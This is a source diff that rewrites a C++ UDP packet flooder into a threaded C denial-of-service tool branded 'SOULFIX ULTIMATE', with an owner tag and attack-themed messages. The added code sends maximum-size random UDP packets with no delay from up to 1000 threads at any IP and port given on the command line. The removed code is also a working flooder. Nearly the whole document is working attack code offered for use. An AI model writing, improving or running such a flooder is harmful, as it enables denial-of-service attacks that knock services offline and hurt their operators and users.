@@ -1,116 +1,111 @@
-#include <iostream>
-#include <vector>
-#include <thread>
-#include <atomic>
-#include <chrono>
-#include <cstring>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
+#include <pthread.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <time.h>
+#include <errno.h>
 
-class UDPFlood {
-public:
-    UDPFlood(const std::string& ip, int port, int duration, int threads)
-        : target_ip(ip), target_port(port),
-          duration_seconds(duration), thread_count(threads) {}
+#define MAX_THREADS 1000    // Adjust based on system limits
+#define PAYLOAD_SIZE 65507  // Max UDP packet size
+#define FLOOD_DELAY 0       // Microseconds between packets (0 = fastest)
 
-    void run() {
-        std::cout << "Starting UDP flood to " << target_ip << ":" << target_port
-                  << " for " << duration_seconds << " seconds using "
-                  << thread_count << " threads\n";
+// Global attack parameters
+char *TARGET_IP;
+int TARGET_PORT;
+int ATTACK_TIME;
+int THREAD_COUNT;
 
-        std::vector<std::thread> workers;
-        for (int i = 0; i < thread_count; ++i) {
-            workers.emplace_back([this]() { worker_thread(); });
-        }
+// Thread function
+void *flood(void *arg) {
+    int sock;
+    struct sockaddr_in server_addr;
+    time_t start_time = time(NULL);
+    time_t end_time = start_time + ATTACK_TIME;
 
-        auto start = std::chrono::steady_clock::now();
-        while (std::chrono::duration_cast<std::chrono::seconds>(
-               std::chrono::steady_clock::now() - start).count() < duration_seconds) {
-            std::this_thread::sleep_for(std::chrono::seconds(1));
-            print_stats();
-        }
-
-        running = false;
-        for (auto& t : workers) {
-            t.join();
-        }
-
-        print_final_stats();
+    // Create socket (UDP flood)
+    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
+        perror("Socket error");
+        pthread_exit(NULL);
     }
 
-private:
-    std::string target_ip;
-    int target_port;
-    int duration_seconds;
-    int thread_count;
-    std::atomic<bool> running{true};
-    std::atomic<uint64_t> packets_sent{0};
-    std::atomic<uint64_t> bytes_sent{0};
+    // Optimize socket for speed
+    int broadcast = 1;
+    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
 
-    void worker_thread() {
-        int sock = socket(AF_INET, SOCK_DGRAM, 0);
-        if (sock < 0) {
-            perror("socket creation failed");
-            return;
-        }
+    // Target setup
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(TARGET_PORT);
+    server_addr.sin_addr.s_addr = inet_addr(TARGET_IP);
 
-        // Set larger buffer size
-        int buf_size = 1024 * 1024; // 1MB
-        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
-
-        struct sockaddr_in addr;
-        memset(&addr, 0, sizeof(addr));
-        addr.sin_family = AF_INET;
-        addr.sin_port = htons(target_port);
-        inet_pton(AF_INET, target_ip.c_str(), &addr.sin_addr);
-
-        // Use optimal 1472 byte payload (Ethernet MTU)
-        char buffer[1472];
-        memset(buffer, 'X', sizeof(buffer));
-
-        while (running) {
-            ssize_t sent = sendto(sock, buffer, sizeof(buffer), 0,
-                                 (struct sockaddr*)&addr, sizeof(addr));
-            if (sent > 0) {
-                packets_sent++;
-                bytes_sent += sent;
-            }
-        }
-        close(sock);
+    // Random payload
+    char payload[PAYLOAD_SIZE];
+    for (int i = 0; i < PAYLOAD_SIZE; i++) {
+        payload[i] = rand() % 256;
     }
 
-    void print_stats() {
-        std::cout << "\rPackets: " << packets_sent
-                  << " | MB: " << bytes_sent / (1024 * 1024)
-                  << " | Threads: " << thread_count << std::flush;
+    printf("[+] Thread %ld attacking %s:%d\n", (long)arg, TARGET_IP, TARGET_PORT);
+
+    // Flood loop (MAX SPEED)
+    while (time(NULL) < end_time) {
+        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
+        usleep(FLOOD_DELAY);  // Optional delay (0 = fastest)
     }
 
-    void print_final_stats() {
-        double mbps = (bytes_sent * 8.0) / (duration_seconds * 1024 * 1024);
-        std::cout << "\n\nTest complete:\n"
-                  << "Total packets: " << packets_sent << "\n"
-                  << "Throughput: " << mbps << " Mbps\n"
-                  << "Average rate: " << packets_sent/duration_seconds << " pps\n";
-    }
-};
+    close(sock);
+    pthread_exit(NULL);
+}
 
-int main(int argc, char* argv[]) {
+int main(int argc, char *argv[]) {
+    printf("\n=== SOULFIX ULTIMATE (THREADED) ===\n");
+    printf(">> Owner: MAUT <<\n");
+    printf(">> 4x Power Upgrade <<\n\n");
+
     if (argc != 5) {
-        std::cerr << "Usage: " << argv[0] << " <ip> <port> <duration> <threads>\n"
-                  << "Example: " << argv[0] << " 192.168.1.100 9999 60 8\n";
-        return 1;
+        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
+        printf("Example: %s 1.1.1.1 80 60 1000\n", argv[0]);
+        exit(1);
     }
 
-    try {
-        UDPFlood flood(argv[1], std::stoi(argv[2]), 
-                     std::stoi(argv[3]), std::stoi(argv[4]));
-        flood.run();
-    } catch (const std::exception& e) {
-        std::cerr << "Error: " << e.what() << "\n";
-        return 1;
+    // Set attack parameters
+    TARGET_IP = argv[1];
+    TARGET_PORT = atoi(argv[2]);
+    ATTACK_TIME = atoi(argv[3]);
+    THREAD_COUNT = atoi(argv[4]);
+
+    if (THREAD_COUNT > MAX_THREADS) {
+        printf("[!] Warning: Too many threads (max %d)\n", MAX_THREADS);
+        THREAD_COUNT = MAX_THREADS;
     }
+
+    printf("[+] Target: %s:%d\n", TARGET_IP, TARGET_PORT);
+    printf("[+] Attack Time: %d seconds\n", ATTACK_TIME);
+    printf("[+] Threads: %d\n", THREAD_COUNT);
+    printf("[+] Starting attack...\n\n");
+
+    // Seed random for payload
+    srand(time(NULL));
+
+    // Create threads
+    pthread_t threads[MAX_THREADS];
+    for (long i = 0; i < THREAD_COUNT; i++) {
+        if (pthread_create(&threads[i], NULL, flood, (void*)i) != 0) {
+            perror("Thread error");
+            continue;
+        }
+    }
+
+    // Wait for threads to finish
+    for (int i = 0; i < THREAD_COUNT; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    printf("\n[+] Attack finished.\n");
+    printf("[+] MAUT was here.\n");
 
     return 0;
 }
